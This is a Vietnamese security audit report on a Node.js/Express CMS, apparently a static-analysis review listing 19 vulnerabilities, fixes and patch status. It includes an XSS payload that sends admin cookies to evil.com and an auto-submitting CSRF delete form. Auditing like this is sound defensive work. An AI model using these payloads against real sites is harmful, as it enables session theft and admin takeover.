# Báo cáo Bảo mật — MPC Mini CMS

> **Ngày kiểm tra:** 2026-05-09
> **Phạm vi:** Toàn bộ codebase `mini-cms/` (Node.js/Express + EJS + SQLite)
> **Phương pháp:** Static code analysis — rà soát thủ công toàn bộ controllers, models, views, middleware, routes, config

---

## Tóm tắt

| Mức độ | Số lượng |
|--------|----------|
| CRITICAL | 6 |
| HIGH | 4 |
| MEDIUM | 4 |
| LOW | 5 |
| **Tổng** | **19** |

---

## CRITICAL — Phải vá ngay lập tức

---

### [CVE-C1] Stored XSS qua form liên hệ công khai

- **File:** `src/views/admin/contact-detail.ejs:56`
- **Loại:** Cross-Site Scripting (Stored XSS)
- **Vector tấn công:** Public → Admin

**Code nguy hiểm:**
```ejs
<%- contact.message.replace(/\n/g, '<br>') %>
```

**Vấn đề:** EJS `<%-` xuất raw HTML không escape. Bất kỳ ai gửi form liên hệ đều có thể inject JavaScript tùy ý. Khi admin mở tin nhắn, script thực thi trong context của admin.

**Kịch bản tấn công:**
```
1. Attacker gửi form liên hệ với message:
   <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

2. Admin mở trang /admin/contacts/:id

3. Script thực thi → cookie session admin bị gửi về attacker

4. Attacker dùng cookie → chiếm toàn bộ quyền admin
```

**Giải pháp:** Đổi `<%-` → `<%=`, dùng `sanitize-html` nếu cần giữ newline.

---

### [CVE-C2] Không có CSRF Protection

- **File:** `app.js`, `src/routes/admin.js`, `src/routes/web.js`
- **Loại:** Cross-Site Request Forgery (CSRF)
- **Ảnh hưởng:** Tất cả POST endpoints (admin + public)

**Vấn đề:** Không có CSRF token trong bất kỳ form nào. Kẻ tấn công tạo trang web với form ẩn, trick admin click vào → trình duyệt admin tự động gửi request kèm session cookie hợp lệ.

**Kịch bản tấn công:**
```html
<!-- Trang của attacker -->
<form action="https://mpcport.com/admin/posts/5/delete" method="POST">
  <input type="submit" value="Nhận quà">
</form>
<script>document.forms[0].submit();</script>
```
→ Admin click link → bài viết bị xóa.

**Routes bị ảnh hưởng:** Tất cả POST: tạo/sửa/xóa bài viết, menu, gallery, documents, contacts.

---

### [CVE-C3] Session Cookie thiếu httpOnly và sameSite

- **File:** `app.js:43–51`
- **Loại:** Session Hijacking

**Code hiện tại:**
```javascript
cookie: {
  secure: process.env.NODE_ENV === 'production',
  maxAge: 24 * 60 * 60 * 1000
  // ❌ Thiếu httpOnly: true
  // ❌ Thiếu sameSite: 'Strict'
}
```

**Hậu quả:**
- Thiếu `httpOnly` → JavaScript có thể đọc cookie qua `document.cookie` → kết hợp với bất kỳ XSS nào là đủ để đánh cắp session
- Thiếu `sameSite` → CSRF attacks hoạt động qua cross-site requests

---

### [CVE-C4] Open Redirect qua Referer Header

- **File:** `src/routes/language.js:12–24`
- **Loại:** Open Redirect

**Code nguy hiểm:**
```javascript
const referer = req.get('Referer') || '/';
res.redirect(referer); // ❌ Không validate!
```

**Kịch bản phishing:**
```
1. Attacker gửi link: https://mpcport.com/lang/vi
   với header Referer: https://evil.com/fake-login

2. Server redirect người dùng sang evil.com

3. URL ban đầu là domain hợp lệ → người dùng mất cảnh giác
```

---

### [CVE-C5] Mật khẩu Admin in ra Console Log

- **File:** `src/config/db.js:152`
- **Loại:** Information Disclosure

**Code nguy hiểm:**
```javascript
console.log(`✅ Đã tạo tài khoản admin: ${username} / ${password}`);
```

**Hậu quả:** Plaintext password ghi vào stdout. Nếu dùng Docker logs, PM2, hoặc bất kỳ log aggregation system nào (Datadog, Loki, CloudWatch) → credential bị lưu vĩnh viễn và có thể bị truy cập bởi nhiều người.

---

### [CVE-C6] Session Secret Mặc định Yếu

- **File:** `app.js:44`
- **Loại:** Weak Cryptography / Session Forgery

**Code nguy hiểm:**
```javascript
secret: process.env.SESSION_SECRET || 'default-secret-key',
```

**Hậu quả:** Nếu `SESSION_SECRET` không được set trong `.env`, session được ký bằng `'default-secret-key'` — public knowledge. Bất kỳ ai cũng có thể tạo session token hợp lệ và bypass authentication.

---

## HIGH — Vá trong sprint này

---

### [CVE-H1] Không có Rate Limiting trên Login

- **File:** `src/controllers/authController.js`, `src/routes/admin.js`
- **Loại:** Brute Force Attack

**Vấn đề:** Endpoint `POST /admin/login` không có throttling. Attacker có thể thử hàng nghìn mật khẩu/giây. Với mật khẩu mặc định `admin123`, tài khoản bị crack trong vài giây.

**Giải pháp:** `express-rate-limit` — giới hạn 10 lần thử/15 phút per IP.

---

### [CVE-H2] Không có Security Headers

- **File:** `app.js` (không có helmet hoặc manual headers)
- **Loại:** Missing Security Headers

**Headers còn thiếu:**

| Header | Bảo vệ chống | Giá trị khuyến nghị |
|--------|-------------|---------------------|
| `Content-Security-Policy` | XSS | `default-src 'self'` |
| `X-Frame-Options` | Clickjacking | `DENY` |
| `X-Content-Type-Options` | MIME sniffing | `nosniff` |
| `Referrer-Policy` | Rò rỉ URL | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | Feature abuse | `camera=(), microphone=()` |

**Giải pháp:** `npm install helmet` + 1 dòng `app.use(helmet())`.

---

### [CVE-H3] File Upload MIME Type Bypass

- **File:** `src/middlewares/uploadMiddleware.js:44–51`
- **Loại:** Unrestricted File Upload

**Code nguy hiểm:**
```javascript
const imageFilter = (req, file, cb) => {
  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
  if (allowedTypes.includes(file.mimetype)) { // ❌ Client-controlled!
    cb(null, true);
  }
};
```

**Vấn đề:** `file.mimetype` do HTTP client gửi lên — hoàn toàn có thể giả mạo. Không có kiểm tra nội dung file thực tế (magic bytes).

**Kịch bản:** Attacker upload file `script.html` với `Content-Type: image/jpeg` → file được lưu → nếu serve với Content-Type thật → XSS.

**Giải pháp:** Dùng thư viện `file-type` để đọc magic bytes sau khi upload.

---

### [CVE-H4] Menu Reorder không Validate Input

- **File:** `src/controllers/menuController.js` (hàm `reorder`)
- **Loại:** Insufficient Input Validation

**Code nguy hiểm:**
```javascript
if (Array.isArray(orders)) {
  MenuModel.reorder(orders); // ❌ Không validate từng phần tử
}
```

**Vấn đề:** Không kiểm tra `id` và `sort_order` là số nguyên hợp lệ. Attacker có thể gửi giá trị âm, số rất lớn, hoặc string để gây lỗi DB hoặc làm hỏng dữ liệu.

---

## MEDIUM — Lên kế hoạch vá

---

### [CVE-M1] Path Traversal trong File Operations

- **File:** `src/controllers/postController.js:175`, `documentController.js:127`, `galleryController.js:92`
- **Loại:** Path Traversal

**Code pattern nguy hiểm:**
```javascript
const filePath = path.join(__dirname, '../../public', doc.filepath);
fs.unlinkSync(filePath); // filepath lấy từ DB — không validate bounds
```

**Vấn đề:** Nếu DB bị compromise hoặc có lỗi SQL injection khác, `filepath` có thể chứa `../../app.js` → file quan trọng bị xóa.

**Giải pháp:**
```javascript
const resolved = path.resolve(__dirname, '../../public', doc.filepath);
const uploadsDir = path.resolve(__dirname, '../../public/uploads');
if (!resolved.startsWith(uploadsDir)) throw new Error('Invalid path');
fs.unlinkSync(resolved);
```

---

### [CVE-M2] Document Download không Validate Directory

- **File:** `src/controllers/documentController.js:29–44`
- **Loại:** Path Traversal / Unauthorized File Access

**Vấn đề:** Tương tự CVE-M1 nhưng cho endpoint download. Cần đảm bảo file download nằm trong `public/uploads/pdfs/`.

---

### [CVE-M3] Filename Generation dùng Math.random

- **File:** `src/middlewares/uploadMiddleware.js:24–29`
- **Loại:** Weak Randomness

**Code nguy hiểm:**
```javascript
const random = Math.floor(Math.random() * 10000); // Chỉ 10,000 giá trị!
return `${timestamp}-${random}${ext}`;
```

**Vấn đề:** `Math.random()` không phải cryptographically secure. Khoảng không gian tên file nhỏ (timestamp × 10,000) → có thể predict tên file và enumerate files.

**Giải pháp:**
```javascript
const random = require('crypto').randomBytes(8).toString('hex');
return `${timestamp}-${random}${ext}`;
```

---

### [CVE-M4] Email Validation Regex Quá Lỏng

- **File:** `src/controllers/contactController.js`
- **Loại:** Insufficient Input Validation

**Regex hiện tại:** `/^[^\s@]+@[^\s@]+\.[^\s@]+$/`

**Chấp nhận sai:** `test@.com`, `a@b.c`, `"test"@domain.com`, v.v.

---

## LOW — Tech debt cần dọn

---

### [CVE-L1] Mật khẩu Mặc định Quá Yếu

- **File:** `.env`, `src/config/db.js`
- **Issue:** Default password `admin123` — có trong top 10 password thông dụng nhất thế giới

---

### [CVE-L2] DOM XSS Pattern trong main.js

- **File:** `public/js/main.js:41`
- **Code:** `preview.innerHTML = '<img style="...">'`
- **Issue:** Hiện tại safe (hardcoded string) nhưng pattern `innerHTML` nguy hiểm nếu sau này có người thêm user data vào đây

---

### [CVE-L3] Logout không có CSRF Token

- **File:** `src/routes/admin.js`
- **Issue:** `POST /admin/logout` là form POST không có CSRF — attacker có thể force-logout admin

---

### [CVE-L4] Không có Per-Resource Authorization

- **File:** Tất cả controllers
- **Issue:** `requireAuth` chỉ check session tồn tại, không check role. Nếu sau này thêm nhiều loại user, không có RBAC để phân quyền.

---

### [CVE-L5] Error Handler không Check NODE_ENV Đáng tin cậy

- **File:** `app.js:85–91`
- **Issue:** `process.env.NODE_ENV === 'development' ? err.message : 'Đã xảy ra lỗi'` — nếu NODE_ENV undefined (không set), biểu thức trả về `false` → safe. Nhưng nếu ai set `NODE_ENV=dev` thay vì `development` → production vẫn leak error message.

---

## Danh sách Files bị ảnh hưởng

| File | CVEs |
|------|------|
| `app.js` | C3, C6, H2, L5 |
| `src/config/db.js` | C5, L1 |
| `src/routes/language.js` | C4 |
| `src/routes/admin.js` | C2, L3 |
| `src/routes/web.js` | C2 |
| `src/controllers/authController.js` | H1 |
| `src/controllers/postController.js` | M1 |
| `src/controllers/documentController.js` | M1, M2 |
| `src/controllers/galleryController.js` | M1 |
| `src/controllers/menuController.js` | H4 |
| `src/controllers/contactController.js` | M4 |
| `src/middlewares/uploadMiddleware.js` | H3, M3 |
| `src/views/admin/contact-detail.ejs` | C1 |
| `public/js/main.js` | L2 |

---

## Xếp hạng Rủi ro Tổng thể

```
Rủi ro hiện tại: CAO

Kịch bản tấn công khả thi nhất:
1. Attacker gửi form liên hệ với payload XSS (CVE-C1)
2. Admin mở tin nhắn → session cookie bị đánh cắp
3. Attacker đăng nhập admin với cookie đó
4. Toàn quyền CMS (đăng bài, xóa data, upload file)

Thời gian tấn công ước tính: < 5 phút với kỹ năng trung bình
```

---

---

## Trạng thái sau khi vá (2026-05-09)

| CVE | Mô tả | Trạng thái |
|-----|--------|-----------|
| C1 | Stored XSS contact-detail.ejs | ✅ Đã vá — `<%-` → `<%=` + pre-wrap |
| C2 | Không có CSRF protection | ✅ Đã vá — CSRF token trong session + verify middleware |
| C3 | Session cookie thiếu flags | ✅ Đã vá — httpOnly + sameSite: Strict |
| C4 | Open Redirect language.js | ✅ Đã vá — same-origin validation |
| C5 | Password in console.log | ✅ Đã vá — xóa password khỏi log |
| C6 | Session secret mặc định yếu | ✅ Đã vá — process.exit(1) nếu không set |
| H1 | Không có rate limiting login | ✅ Đã vá — 10 lần/15 phút với express-rate-limit |
| H2 | Không có security headers | ✅ Đã vá — helmet với CSP |
| H3 | File upload MIME bypass | ✅ Đã vá — magic bytes với file-type |
| H4 | Menu reorder không validate | ✅ Đã vá — integer validation cho id + sort_order |
| M1 | Path traversal file delete | ✅ Đã vá — safeUnlink() với bounds check |
| M2 | Document download path | ✅ Đã vá — safeResolve() với bounds check |
| M3 | Math.random() trong filename | ✅ Đã vá — crypto.randomBytes(8) |
| M4 | Email regex quá lỏng | ✅ Đã vá — RFC 5322 compliant regex |
| L1 | Default password admin123 | ✅ Đã vá — .env.example với hướng dẫn |
| L2 | innerHTML pattern | ✅ Đã vá — refactor sang createElement |
| L3 | Logout thiếu CSRF | ✅ Đã vá — CSRF token trong logout form |
| L4 | Không có RBAC | ⬜ Pending — chưa có multi-user requirement |
| L5 | NODE_ENV check | ✅ Đã vá — startup log + safe default |

**Rủi ro còn lại:** THẤP — L4 (RBAC) chỉ cần thiết khi có nhiều loại admin user.

*Báo cáo này được tạo tự động bằng static analysis. Cần penetration testing thực tế để xác nhận các vector tấn công.*
